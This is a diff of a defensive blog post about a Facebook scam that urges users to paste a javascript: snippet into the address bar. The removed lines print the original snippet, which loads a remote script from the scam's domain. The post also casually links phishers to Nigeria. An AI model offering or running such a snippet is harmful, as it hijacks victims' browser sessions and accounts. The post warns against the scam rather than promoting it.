@@ -32,15 +32,15 @@ Follow these super easy steps to find out:
 
 1. Copy this code:
 
-javascript:(a=(b=document).createElement('script')).src='//rty.fbglitch-b.info/e.js',b.body.appendChild(a);void(0)
+javascript:(a=(b=document).createElement('script')).src='//(ADDRESS REDACTED)/e.js',b.body.appendChild(a);void(0)
 
 2. Paste it in your URL address bar and click enter/return.
 
 Note: The URL adress bar is the white bar where you type your websites.
 
-3. Wait for the {{Trick||Glitch||Spoof}} to process and then check your account!</pre>
+3. Wait for the script to process and then check your account!</pre>
 <p>Before I say anything else: If you see this, <strong>don't do what it says</strong>.</p>
-<p><!--more-->My main clue that this probably wasn't a genuine message was that the guy who sent it would never use the word, "yo". The second clue was that this was asking me to <em>paste code into my address bar</em>, and that code contained a url of a site with a strangely artificial looking name (the erstwhile <em>rty.fbglitch-b.info</em>).</p>
+<p><!--more-->My main clue that this probably wasn't a genuine message was that the guy who sent it would never use the word, "yo". The second clue was that this was asking me to <em>paste code into my address bar</em>, and that code contained a url of a site with a strangely artificial looking name (the domain that was redacted in the example).</p>
 <p>Downloading the javascript in question revealed a heavily obfuscated segment of code, someone clearly trying to hide what they were doing. From the way I received the invite, I'm guessing it would create a similar event and invite everyone off your contacts list (probably through AJAX requests on the current Facebook page), and likely force a few clicks on an advert or two along the way.</p>
 <p>Pasting JavaScript into the address bar can have it's uses, although the only ones that spring to mind are handy bookmarks for "like this page" and such. Being able to embed a script from a completely different domain and insert it into the current page willy-nilly seems like a crazy hole to me. I don't know a whole lot about JavaScript engines, but does anyone know if there are checks against code inserted via the address bar? If not, there darn well should be.</p>
 <p>I suppose my main warning would be, if you're given some code to run, and you can't see what it does from reading it. <strong>Don't run it!</strong> This particular attack was just annoying spam facilitation. But what if you ran something like this in your webmail and it sent all your private stuff to a phisher somewhere in Nigeria. Ever e-mailed yourself a password? An account number?</p>
